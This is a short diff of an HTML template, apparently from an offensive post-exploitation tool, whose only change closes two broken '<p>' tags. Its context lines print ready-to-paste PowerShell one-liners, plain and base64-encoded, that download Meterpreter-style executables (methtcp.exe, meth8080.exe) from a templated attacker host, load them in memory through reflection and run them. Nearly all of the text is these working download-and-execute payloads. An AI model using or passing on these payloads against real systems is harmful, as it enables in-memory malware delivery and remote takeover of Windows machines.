@@ -240,13 +240,13 @@ sessions
 <p>Basic injection</p>
 <pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
 
-<p>Powershell encoded</p
+<p>Powershell encoded</p>
 <pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
 
 <p>Basic injection Meterpreter port 8080</p>
 <pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
 
-<p>Powershell encoded</p
+<p>Powershell encoded</p>
 <pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
 
 
